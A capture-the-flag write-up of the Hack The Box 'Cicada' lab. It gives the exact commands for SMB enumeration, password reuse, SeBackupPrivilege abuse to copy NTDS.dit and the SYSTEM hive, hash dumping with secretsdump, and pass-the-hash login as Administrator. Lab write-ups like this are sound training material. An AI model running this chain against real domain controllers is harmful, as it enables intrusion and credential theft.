# Cicada  

**Author:** p4pa  
**Platform:** Hack The Box (Easy)  

## Reconnaissance

### NMAP

Starting with **Nmap**, I scanned the target to identify any open ports and services. This would guide my initial approach, helping me focus on the services that might allow further access.

```bash
nmap -Pn 10.10.11.35
```

This scan revealed a range of open ports, suggesting a **Windows environment** with possible Active Directory (AD) involvement, given the presence of SMB, LDAP, and Kerberos ports:

```bash
PORT     STATE SERVICE
53/tcp   open  domain            # DNS
88/tcp   open  kerberos-sec      # Kerberos
135/tcp  open  msrpc             # RPC
139/tcp  open  netbios-ssn       # NetBIOS
389/tcp  open  ldap              # LDAP
445/tcp  open  microsoft-ds      # SMB
464/tcp  open  kpasswd5          # Kerberos password change
593/tcp  open  http-rpc-epmap    # HTTP RPC endpoint mapper
3268/tcp open  globalcatLDAP     # Global Catalog LDAP
3269/tcp open  globalcatLDAPssl  # Global Catalog LDAP over SSL
```

To gain more insight, I ran an **Nmap service scan** on these ports, aiming to detect version details and confirm any AD clues.

```bash
nmap -p 53,88,135,389,445,464,593,3268,3269 -sV 10.10.11.35 -Pn
```

### LDAP and SMB

I started with **LDAP** as it can sometimes allow anonymous binding, giving access to AD information. Here, however, **anonymous bind was denied**, indicating that authentication was required.

```bash
ldapsearch -H ldap://10.10.11.35:389 -x
```

Next, I explored **SMB**. Using `smbclient`, I listed available shares and tried accessing them without credentials. This worked for several shares, but only **HR** allowed anonymous access.

```bash
smbclient -L //10.10.11.35 -N
```

Listing the contents of `HR`, I found a file called *"Notice from HR.txt"*:

```bash
smb: \> ls
Notice from HR.txt
```

Opening it revealed what appeared to be **default credentials** for new hires:

```plaintext
Your default password is: Cicada$M6Corpb*@Lp#nZp!8
```

This was promising, as it implied we might have found a valid **AD account credential**.

### RPC Enumeration

With this initial password in hand, I turned to **RPC**. First, I attempted **anonymous enumeration** via `rpcclient`:

```bash
rpcclient -U "" 10.10.11.35
```

However, I didn’t have the required permissions for user enumeration as an anonymous user. Using the **default HR credentials**, I was able to log in successfully, though I still couldn’t enumerate all users without higher permissions.

### HTTP and RPC Endpoint Analysis

The **HTTP endpoint on port 593** was notable as it provided **RPC over HTTP**—an older service that can sometimes leak endpoint information. Running a scan revealed multiple endpoints, including:

- **LiveIdSvc RPC** - potentially related to Microsoft account authentication.
- **Group Policy RPC Interface** - could be useful if it holds misconfigured policies.
- **MS NT Directory DRS Interface** - ties into AD replication, hinting that this machine might indeed be a domain controller.

## SMB User Enumeration with NXC

At this point, I reached out to a friend ([Co3lho](https://github.com/Co3lho22)) who recommended **NXC**, a helpful tool for SMB enumeration, especially within AD environments. NXC’s **RID-brute** functionality can reveal domain users by brute-forcing their relative IDs (RIDs).

```bash
nxc smb -u 'asdf' -p '' --rid-brute 20000 10.10.11.35
```

The enumeration yielded several accounts, including **michael.wrightson**. I attempted to log in using the **HR default password**:

```bash
nxc smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

After gaining access with Michael’s credentials, I used **NXC to enumerate other users**. This resulted in the discovery of **David Orelious’s credentials**:

- Username: `david.orelious`
- Password: `aRt$Lp#7t*VQ!3`

Testing David’s login on SMB, I found he had access to a **DEV share**, where I discovered a **backup script**. Reviewing this script yielded even more credentials:

```plaintext
emily.oscars
Q!3@Lp#M6b*7t*Vt
```

## Privilege Escalation and Reverse Shell

With **Emily Oscars’ credentials** in hand, I decided to try for a remote session with **Evil-WinRM**.

```bash
evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

After logging in, I checked her **privileges** using `whoami /priv`. The output showed **SeBackupPrivilege** and **SeRestorePrivilege**, which are essential for accessing and modifying files usually restricted to admins:

```plaintext
SeBackupPrivilege
SeRestorePrivilege
```

### Directory Discovery and Privilege Escalation with SeBackupPrivilege

Having **SeBackupPrivilege** meant I could attempt to access otherwise restricted system files, like `NTDS.dit`, which holds AD data. To exploit this, I wrote a **diskshadow script** to mount the C drive:

```plaintext
set metadata C:\Windows\Temp\meta.cab
add volume C: alias cdrive
expose %cdrive% E:
```

Using **diskshadow** with this script allowed me to mount the drive for backup:

```bash
diskshadow /s backup_script.txt
```

### Extracting NTDS.dit with Robocopy

Once mounted, I used **Robocopy** to copy `NTDS.dit` and acquire **encrypted AD user data**:

```bash
robocopy /b E:\Windows\ntds . ntds.dit
```

I also needed the **SYSTEM registry hive** to decrypt these hashes, so I saved it using the **reg save** command:

```bash
reg save hklm\system C:\Users\emily.oscars.CICADA\Documents\system.bak
```

### Dumping Administrator Hash

I downloaded `ntds.dit` and `system.bak`, then used **Impacket’s secretsdump** to extract the **Administrator NTLM hash**:

```bash
impacket.secretsdump -ntds ntds.dit -system system.bak local
```

Finally, with the Administrator hash, I logged in using Evil-WinRM to access the Administrator account:

```bash
evil-winrm -i 10.10.11.35 -u Administrator -H <hash>
```

**Flag:** The **root flag** was located in `root.txt`.
